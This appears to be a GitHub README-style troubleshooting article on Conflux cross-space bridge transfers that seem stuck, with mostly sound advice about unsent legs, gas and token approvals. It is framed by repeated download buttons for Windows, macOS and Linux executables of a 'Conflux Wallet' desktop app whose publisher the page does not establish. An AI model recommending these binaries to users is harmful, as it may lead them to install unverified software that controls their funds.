![Conflux Wallet](assets/banner-article.png)

# Bridge Transfer Stuck

<p align="center">Bridge Transfer Stuck: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** A bridge transfer between Conflux's two spaces is rarely stuck on the network side. Almost always it is waiting for a step that was never sent - usually the second leg of an eSpace to Core transfer, which needs gas on both sides. Start by finding which hashes exist, then finish the missing leg.

## Where a transfer stops

The cross-space mechanism moves value in steps, and a step is only sent when someone sends it. Between the steps the value sits in an intermediate state that belongs to your account but is not on either balance in the way you expect.

So "stuck" usually means "paused". The funds are attributable, the operation is resumable, and the fix is a transaction rather than a support ticket. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/bridge-cfx-from-conflux-core-space-to-espace.md covers the mechanism; this page covers the failure.

## No CFX after bridging

Check the space selector before anything else. A transfer into eSpace credits the `0x` account; if the app is showing Core Space, the balance you are looking at is the one that was debited, not the one that was credited.

Then confirm the destination address was yours in that space. Sending to a `0x` address that the protocol derived for a Core Space account is correct; sending to any other `0x` address is a transfer to whoever owns it.

## The two-step return

Moving from eSpace back to Core Space takes two transactions: one on eSpace to a derived address, and a withdrawal sent from the Core Space account. The first alone leaves the value in the intermediate state, and it will sit there indefinitely.

If the Core Space account was emptied by that first leg, there is nothing to pay the withdrawal with - which is the trap. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-bridge-gas-fees.md explains the arithmetic, and the remedy is to fund the Core Space account with a small amount of CFX from elsewhere.

## Reading the hashes

One hash means one leg done. Two hashes mean the transfer completed or the second leg failed on its own terms, which the second hash will show. No hash means nothing was sent, whatever the interface implied.

This is the diagnostic that ends most of these conversations: the number of hashes tells you exactly which stage you are at. The activity view in the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) keeps both legs of an operation together, so the count is visible without leaving the app. https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-balance-shows-zero.md covers what to check once both legs exist but the balance still looks wrong.

## The older bridge

Conflux's first bridge service closed in November 2023, and asset bridging moved to a successor operated by the ecosystem, while the protocol-level route through the cross-space call remained. A guide written before that date describes a product that no longer exists.

If you are following instructions that reference the old service, stop: the interface, the addresses and the asset list have all changed. What did not change is the protocol mechanism underneath, which is why the two-step shape still applies today.

## Bridged token addresses

This page will not print contract addresses for bridged assets, and that is deliberate. A token address is a destination for money, a wrong one is indistinguishable from a right one at a glance, and a published list goes stale the moment an asset is added or redeployed.

Take the address from the bridge you actually used, or from the explorer's token page for the asset, and verify it by checking that the token's supply and holder count look like a real deployment rather than an empty imitation. Adding a token shows a balance; it never moves funds, so a wrong addition costs nothing but a wrong number on screen.

## Why a token balance looks wrong

A wallet shows the tokens it has been told about. A bridged asset that has not been added to the app is invisible even though it is in the account, and an imitation token with the same symbol will happily display a fake balance.

Decimals are the other half of the illusion: a token added with the wrong decimal setting shows a balance off by orders of magnitude while being perfectly correct on-chain. When a bridged balance looks absurd, suspect the display before the bridge.

## What is genuinely stuck

Real stalls exist: a leg that was sent and failed, a leg sent to an address the recipient does not control, a transaction pending because its fee was set too low. Those are ordinary transaction problems and behave like any other - https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-address-formats-cfx-vs-0x.md decides which space an address belongs to, https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-cfx-wrong-network.md covers what is still possible after a wrong-space send, and usually that is very little.

Do not re-send the first leg to "push it through". Two half-completed transfers are harder to untangle than one, and the second usually duplicates the first's mistake.

## Bridge sites and approvals

Bridge interfaces ask for token approvals, and an unlimited approval to a contract you cannot identify is a standing risk rather than a one-time one. Approve the amount you intend to move; if the interface insists on unlimited, treat that as information about the operator.

And no bridge needs your recovery phrase. A page that asks for one is not a bridge, whatever it says about verifying your wallet - the same rule that covers every other page in this ecosystem. Conflux Wallet remains actively maintained - the release page carries the build with the latest fixes.

## FAQ

### Why is there no CFX in my Core Space account after bridging?

Either the second leg was never sent, or the app is showing the wrong space. Check the hashes first, then the space selector.

### Can I finish a bridge transfer later?

Yes. The intermediate state persists, and the missing leg can be sent whenever you have gas on that side. Nothing expires.

### Why did bridging cost two fees?

Each leg is a transaction on its own side. Core to eSpace is one leg; eSpace to Core is two, paid on two different ledgers.

### The old bridge I used is gone. Is my transfer lost?

No - a completed transfer is on-chain regardless of what happened to the interface. Only an unsent step is unfinished.

### Should I re-send to make it go through?

No. Find out which leg is missing and send that one. Re-sending the completed leg sends a second transfer.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [Bridge CFX Across Spaces](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/bridge-cfx-from-conflux-core-space-to-espace.md)
- [Bridge Gas and Fees](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-bridge-gas-fees.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
